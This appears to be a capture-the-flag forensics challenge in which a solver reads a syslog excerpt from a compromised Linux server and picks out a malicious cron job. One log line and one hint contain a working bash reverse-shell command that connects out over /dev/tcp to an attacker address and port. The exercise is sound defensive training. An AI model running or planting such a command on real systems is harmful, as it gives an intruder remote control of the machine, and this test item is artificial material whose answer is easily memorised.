title: Cron Job Backdoor
description:
Review this syslog excerpt from a compromised Linux server. What command did the attacker schedule in cron?

Jan 10 03:00:01 server CRON[5678]: (root) CMD (/usr/bin/find /tmp -name '*.log' -delete)
Jan 10 03:15:01 server CRON[5679]: (www-data) CMD (/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1')
Jan 10 03:30:01 server CRON[5680]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)
Jan 10 03:45:01 server CRON[5681]: (root) CMD (/usr/bin/apt-get update -q)

Which cron entry is the reverse shell backdoor, and what port does it connect to?

Submit as: flag{port_number}
hints: Look for network connections in cron â€” that's unusual
The /dev/tcp/ path is a bash special file for network connections
bash -i >& /dev/tcp/IP/PORT creates an interactive reverse shell
